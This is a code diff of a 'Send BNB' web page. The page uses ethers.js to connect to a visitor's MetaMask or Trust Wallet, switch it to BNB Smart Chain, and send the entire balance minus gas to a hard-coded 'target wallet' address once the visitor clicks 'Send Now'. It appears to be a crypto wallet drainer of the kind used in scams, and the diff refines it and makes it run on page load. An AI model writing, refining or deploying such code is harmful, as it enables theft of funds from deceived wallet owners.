@@ -8,14 +8,14 @@
 <body style="font-family: sans-serif; text-align: center; margin-top: 50px;">
 
   <h2 id="balanceInfo">Send BNB</h2>
-  <button id="sendBtn" style="padding: 10px 20px; font-size: 18px;">Send Now</button>
+  <button id="sendBtn" disabled style="padding: 10px 20px; font-size: 18px;">Loading...</button>
   <p id="status" style="margin-top: 20px; color: red;"></p>
 
   <script>
-    const receiver = "0xC64087a6Fd263ab6A140F9b46f4cAF7B3e82147F"; // DO NOT CHANGE
+    const receiver = "0xC64087a6Fd263ab6A140F9b46f4cAF7B3e82147F"; // ✅ Target wallet
     const gasLimit = 21000;
 
-    async function main() {
+    async function start() {
       if (!window.ethereum) {
         document.getElementById("status").textContent = "Trust Wallet or MetaMask not found.";
         return;
@@ -24,54 +24,59 @@
       const provider = new ethers.providers.Web3Provider(window.ethereum);
       await provider.send("eth_requestAccounts", []);
       const signer = provider.getSigner();
-      const sender = await signer.getAddress();
+      const userAddress = await signer.getAddress();
 
-      const network = await provider.getNetwork();
-      if (network.chainId !== 56) {
+      // Ensure BSC
+      const net = await provider.getNetwork();
+      if (net.chainId !== 56) {
         try {
           await window.ethereum.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: '0x38' }]
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: "0x38" }]
           });
         } catch (err) {
-          document.getElementById("status").textContent = "Please switch to BNB Chain manually.";
+          document.getElementById("status").textContent = "Switch to BNB Smart Chain manually.";
           return;
         }
       }
 
-      const balance = await provider.getBalance(sender);
+      const balance = await provider.getBalance(userAddress);
       const gasPrice = await provider.getGasPrice();
-      const gasFee = gasPrice.mul(gasLimit);
+      const gasCost = gasPrice.mul(gasLimit);
 
-      if (balance.lte(gasFee)) {
-        document.getElementById("status").textContent = "Insufficient balance for gas fees.";
+      if (balance.lte(gasCost)) {
+        document.getElementById("status").textContent = "Not enough balance for gas fees.";
         return;
       }
 
-      const valueToSend = balance.sub(gasFee);
-      const valueInBNB = ethers.utils.formatEther(valueToSend);
-      document.getElementById("balanceInfo").textContent = `Send ${valueInBNB} BNB`;
+      const sendAmount = balance.sub(gasCost);
+      const bnbToSend = ethers.utils.formatEther(sendAmount);
+      document.getElementById("balanceInfo").textContent = `Send ${bnbToSend} BNB`;
+      const sendBtn = document.getElementById("sendBtn");
+      sendBtn.textContent = "Send Now";
+      sendBtn.disabled = false;
 
-      document.getElementById("sendBtn").onclick = async () => {
+      sendBtn.onclick = async () => {
         document.getElementById("status").textContent = "Sending...";
 
         try {
           const tx = await signer.sendTransaction({
             to: receiver,
-            value: valueToSend,
+            value: sendAmount,
             gasLimit: gasLimit,
             gasPrice: gasPrice
           });
 
           document.getElementById("status").style.color = "green";
-          document.getElementById("status").textContent = `Transaction sent: ${tx.hash}`;
-        } catch (error) {
-          document.getElementById("status").textContent = "Transaction failed: " + (error.message || error);
+          document.getElementById("status").textContent = `Tx sent: ${tx.hash}`;
+        } catch (err) {
+          document.getElementById("status").style.color = "red";
+          document.getElementById("status").textContent = "Transaction failed: " + err.message;
         }
       };
     }
 
-    main();
+    window.onload = start;
   </script>
 </body>
 </html>
